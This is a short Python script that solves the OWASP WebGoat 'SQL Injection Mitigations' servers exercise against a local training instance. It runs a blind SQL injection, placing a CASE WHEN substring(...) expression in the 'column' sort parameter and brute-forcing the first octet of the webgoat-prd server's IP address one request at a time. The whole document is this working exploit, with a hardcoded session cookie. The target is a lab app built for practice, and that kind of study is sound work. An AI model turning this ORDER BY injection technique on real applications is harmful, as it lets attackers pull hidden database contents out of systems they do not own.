import requests

# Enter target URL & JSESSION cookie value
base_url = 'http://127.0.0.1:8080/WebGoat/SqlInjectionMitigations/servers'
jsessionid = 'NfN69xLyxeqD3fPYVV3ZSAspM6QTXX0XI3ribwnf'

headers = {"Cookie":"JSESSIONID={}".format(jsessionid)}
ip_end = ".130.219.202"

print("Attempting blind SQL injection on 'SQL Injection Mitigations server' exercise.")
for ip in range(1, 255):
        url = "{}?column=(case+when+(substring((select+ip+from+servers+where+hostname%3d'webgoat-prd')"\
                ",1,3)={}{})+then+id+else+status+end)".format(base_url,ip,ip_end[0:(4-len(str(ip)))])
        p = requests.get(url, headers=headers)
        server_id = str(p.content[14:15]).lstrip('\'b').rstrip('\'')
        if server_id == "1":
                print("Match found: {}{}".format(ip,ip_end))
                break
        else:
                print("Checked {}{}".format(ip,ip_end))
